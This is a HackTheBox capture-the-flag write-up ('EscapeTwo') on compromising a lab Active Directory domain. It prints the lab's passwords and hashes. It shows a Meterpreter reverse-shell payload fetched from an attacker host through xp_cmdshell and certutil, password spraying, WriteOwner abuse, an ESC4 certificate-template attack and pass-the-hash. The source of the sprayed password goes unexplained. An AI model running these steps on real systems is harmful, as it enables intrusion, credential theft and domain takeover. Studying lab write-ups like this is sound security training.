---
title: "HTB-Escape-Two-Medium"
date: "2025-11-26"
platform: "HackTheBox"
category: "Windows Active Directory"
difficulty: "Medium"
tags: [
  "MSSQL Exploitation",
  "xp_cmdshell",
  "SMB Enumeration",
  "Credential Harvesting",
  "Excel Forensics",
  "Password Spraying",
  "WriteOwner Abuse",
  "PowerView",
  "DACL Abuse",
  "Active Directory",
  "ADCS",
  "ESC4",
  "Certificate Templates",
  "PKINIT",
  "Certificate Authentication",
  "Impacket",
  "certipy",
  "Privilege Escalation",
  "Pass-the-Hash"
]
excerpt: "A multi-layered AD compromise involving MSSQL exploitation using xp_cmdshell, recovering credentials from corrupted Excel files, abusing WriteOwner privileges for user takeover, and exploiting ADCS (ESC4) to obtain an Administrator certificate and achieve full domain compromise."
readingTime: 25
featured: true
---


## Initial Access

We start with credentials provided:

```
Username: rose
Password: KxEPkKe6R8su
```

---

## Initial Reconnaissance

### Port Scanning with Nmap

Let's scan the target to identify running services:

```bash
nmap --privileged -sV -sC -p- -vv -T4 -o EscapeTwo_nmap.txt 10.10.11.51
```

**Key Services Identified:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds? (SMB)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**Key Observations:**

- Domain: `sequel.htb`
- DC: `DC01.sequel.htb`
- **MSSQL Server 2019** running on port 1433 🎯
- SMB and WinRM available
- Standard AD services present

---

## SMB Enumeration

Let's connect to SMB using our credentials:

```bash
smbclient -U 'rose%KxEPkKe6R8su' -L //10.10.11.51
```

**Accessible Shares:**

- `News`
- `Users`
- `Accounting Department` ⭐

The "Accounting Department" share looks promising! Let's explore it:

```bash
smbclient -U 'rose%KxEPkKe6R8su' '//10.10.11.51/Accounting Department'
```

![image](1.png)

We discover **two Excel files (.xlsx)**! Let's download them:

```smb
get file1.xlsx
get file2.xlsx
```

---

## Repairing Corrupted Excel Files

When we try to open the files, we get corruption errors. Time for some file forensics! 💻

### The Fix

Excel files are actually ZIP archives. We can repair them using Microsoft's built-in repair feature:

**Steps to Repair:**

1. Transfer files to Windows
2. Right-click → Open with Excel
3. When prompted with corruption error, select **"Yes"** to repair
4. Excel will attempt to recover the content

🔗 **Reference:** [Microsoft Office - Repair a Corrupted Workbook](https://support.microsoft.com/en-us/office/repair-a-corrupted-workbook-153a45f4-6cab-44b1-93ca-801ddcd4ea53)

### Recovered Credentials

After repairing the files, we extract valuable credentials:

![image](2.png)

**Credentials Table:**

|First Name|Last Name|Email|Username|Password|
|---|---|---|---|---|
|Angela|Martin|angela@sequel.htb|angela|0fwz7Q4mSpurIt99|
|Oscar|Martinez|oscar@sequel.htb|oscar|86LxLBMgEWaKUnBG|
|Kevin|Malone|kevin@sequel.htb|kevin|Md9Wlq1E5bZnVDVo|
|||sa@sequel.htb|**sa**|**MSSQLP@ssw0rd!**|

The **`sa`** (System Administrator) account for MSSQL! 🎯 This is the jackpot!

---

## MSSQL Exploitation

### Connecting to MSSQL

Let's use Impacket's `mssqlclient` to connect:

```bash
impacket-mssqlclient 'sa@10.10.11.51'
```

**Password:** `MSSQLP@ssw0rd!`

### Enabling xp_cmdshell

`xp_cmdshell` is a powerful MSSQL feature that allows us to execute operating system commands directly from SQL queries. It's disabled by default for security reasons.

**Enable xp_cmdshell:**

```sql
EXEC sp_configure 'show advanced options', 1
RECONFIGURE

EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

EXEC sp_configure 'xp_cmdshell' -- Verify it's enabled
```

### Getting a Reverse Shell

Now that we have command execution, let's get a proper Meterpreter shell for stability.

**Step 1: Generate payload**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.8 \
  LPORT=4444 \
  -f exe \
  -o shell.exe
```

**Step 2: Host the file**

```bash
python3 -m http.server 80
```

**Step 3: Download to target via MSSQL**

```sql
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.8:80/shell.exe C:\Windows\Temp\shell.exe'
```

**Step 4: Start Metasploit listener**

```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.8; set lport 4444; exploit"
```

**Step 5: Execute the payload**

```sql
EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe'
```

![image](3.png)

**We have a Meterpreter session!** 🎉

---

## Enumeration as sql_svc

### Discovering Domain Users

Let's enumerate users on the domain:

```cmd
net user

User accounts for \\DC01
-------------------------------------------------------------------------------
Administrator            ca_svc                   Guest                    
krbtgt                   michael                  oscar                    
rose                     ryan                     sql_svc
```

![image](4.png)

### Password Spraying

We have several passwords from the Excel file. Let's try password spraying against all users:

**Create user list:**

```
Administrator
ca_svc
michael
oscar
rose
ryan
sql_svc
```

**Password spray with NetExec:**

```bash
netexec smb sequel.htb -u Users.txt -p 'WqSZAF6CysDQbGb3'
```

![image](5.png)

**Hit!** The password `WqSZAF6CysDQbGb3` works for user **ryan**! 🎯

---

## User Flag - Access as Ryan

Let's connect via WinRM:

```bash
evil-winrm -i sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
```

**User Flag:** `3715b6c278d4e531302ebe059db99c13` ✅

---

## Privilege Escalation - Part 1: WriteOwner Attack

### Enumerating Ryan's Permissions

Using BloodHound or manual enumeration, we discover that **ryan** has **WriteOwner** permissions over the **ca_svc** user account!

![image](6.png)

This is a powerful privilege escalation path! Let's exploit it.

### What is WriteOwner?

**WriteOwner** allows you to:

1. ✅ Change the **owner** of an Active Directory object
2. ✅ Once you own an object, you can modify its permissions
3. ✅ Grant yourself any permissions you want
4. ✅ Reset passwords, modify attributes, etc.

### Exploitation with PowerView

We'll use **PowerView.ps1** for this attack. First, upload it:

```powershell
upload /path/to/PowerView.ps1
Import-Module .\PowerView.ps1
```

### Attack Steps

**Step 1: Take Ownership of ca_svc**

```powershell
Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
```

**What this does:**

- Changes the **owner** of the `ca_svc` AD object to `ryan`
- Owner has implicit rights to modify object permissions (DACL)

**Step 2: Grant Yourself Full Control** ⭐

```powershell
Add-DomainObjectAcl -TargetIdentity "ca_svc" -PrincipalIdentity "ryan" -Rights All
```

**What this does:**

- Adds an Access Control Entry (ACE) to ca_svc's DACL
- Grants `ryan` **ALL permissions** over `ca_svc`

**Rights included:**

- `GenericAll` - Complete control
- `ResetPassword` - Change password
- `WriteProperty` - Modify attributes
- `WriteDacl` - Modify permissions
- `WriteOwner` - Change ownership

⚠️ **CRITICAL:** This step is required! Without it, password reset will fail with "Access Denied"

**Step 3: Create Secure Password Object**

```powershell
$cred = ConvertTo-SecureString "Password123" -AsPlainText -Force
```

**What this does:**

- Converts plaintext to SecureString object
- Required for security by PowerShell cmdlets

**Step 4: Reset ca_svc Password**

```powershell
Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
```

**Success!** We've reset ca_svc's password to `Password123`

**New Credentials:**

```
Username: ca_svc
Password: Password123
```

---

## Privilege Escalation - Part 2: ADCS Exploitation (ESC4)

### Discovering Certificate Services

Let's enumerate what groups ca_svc belongs to:

![image](7.png)

**Key Discovery:** `ca_svc` is a member of the **Cert Publishers** group! 🎯

This group typically has elevated permissions on certificate templates in Active Directory Certificate Services (ADCS).

### What is ESC4?

**ESC4** is a privilege escalation technique where an attacker has **write permissions** on a certificate template. This allows them to:

1. Modify the template configuration
2. Make it vulnerable to ESC1 (allowing SAN specification)
3. Request a certificate as any user (including Administrator)
4. Authenticate using that certificate

### Enumerating Certificate Templates

```bash
certipy find -u 'ca_svc@sequel.htb' \
  -p 'Password123' \
  -dc-ip 10.10.11.51 \
  -stdout
```

**Discovery:**

- Template: `DunderMifflinAuthentication`
- Status: **Enabled**
- Permission: **Full Control** for `Cert Publishers` group
- **Vulnerability: ESC4** 🔥

### ESC4 Exploitation Steps

**Step 1: Backup Original Template Configuration**

```bash
certipy template -template DunderMifflinAuthentication \
  -save-configuration DunderMifflinAuthentication_backup.json \
  -u ca_svc@sequel.htb \
  -p 'Password123' \
  -dc-ip 10.10.11.51
```

**Output:**

```
[*] Saving current configuration to 'DunderMifflinAuthentication_backup.json'
[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication_backup.json'
```

⚠️ **Why backup?** For forensics, cleanup, and preventing detection

**Step 2: Modify Template to be ESC1-Vulnerable**

```bash
certipy template -template 'DunderMifflinAuthentication' \
  -write-default-configuration \
  -u ca_svc@sequel.htb \
  -p 'Password123' \
  -dc-ip 10.10.11.51
```

**What this does:**

- Sets `ENROLLEE_SUPPLIES_SUBJECT` flag
- Allows requestor to specify Subject Alternative Name (SAN)
- Enables Client Authentication EKU
- Removes enrollment restrictions

**Key Changes:**

```
msPKI-Certificate-Name-Flag: 1
  → Enables ENROLLEE_SUPPLIES_SUBJECT
  
msPKI-Enrollment-Flag: 0
  → Removes enrollment restrictions
  
pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
  → Client Authentication (for domain auth)
```

**Step 3: Request Certificate as Administrator**

```bash
certipy req -u ca_svc@sequel.htb \
  -p 'Password123' \
  -ca sequel-DC01-CA \
  -template 'DunderMifflinAuthentication' \
  -upn administrator@sequel.htb \
  -dc-ip 10.10.11.51
```

**Parameters:**

- `-ca sequel-DC01-CA` → Certificate Authority name
- `-template` → Our modified vulnerable template
- `-upn administrator@sequel.htb` → **Target identity to impersonate** 🎯
- `-dc-ip` → Domain Controller IP

**Successful Output:**

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 8
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

**We now have a certificate for the Administrator account!** 🎉

**Step 4: Authenticate with Certificate (PKINIT)**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
```

**What happens:**

1. Uses **Kerberos PKINIT** authentication
2. Presents certificate to the Key Distribution Center (KDC)
3. KDC validates the certificate
4. Returns **TGT** and **NTLM hash**

**Successful Output:**

```
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': 
    aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845ca8b78e61cd3b93f1c
```

**Credentials Obtained:**

- **NTLM Hash:** `8a4b77d52b1845ca8b78e61cd3b93f1c`
- **Kerberos TGT:** `administrator.ccache`

---

## Root Flag - Pass-the-Hash

Let's use PSExec with our newly acquired hash:

```bash
impacket-psexec -hashes :8a4b77d52b1845ca8b78e61cd3b93f1c \
  administrator@10.10.11.51
```

**Alternative - WinRM:**

```bash
evil-winrm -i 10.10.11.51 \
  -u Administrator \
  -H 8a4b77d52b1845ca8b78e61cd3b93f1c
```

**Root Flag:** `1bf478768e3b67577bd6dc59c5c5d7e4` 🏆

---

## Attack Chain Summary

```
Initial Credentials (rose)
  ↓
SMB Enumeration
  ↓
Corrupted Excel Files → Repair
  ↓
MSSQL Credentials (sa account)
  ↓
xp_cmdshell Enabled
  ↓
Meterpreter Shell as sql_svc
  ↓
Password Spraying → ryan credentials
  ↓
WriteOwner Privilege on ca_svc
  ↓
Take Ownership → Grant Permissions → Reset Password
  ↓
ca_svc Credentials (Cert Publishers group)
  ↓
ESC4: Modify Certificate Template
  ↓
Request Certificate as Administrator
  ↓
PKINIT Authentication → NTLM Hash
  ↓
Pass-the-Hash → Administrator
  ↓
SYSTEM ACCESS! 🎯
```
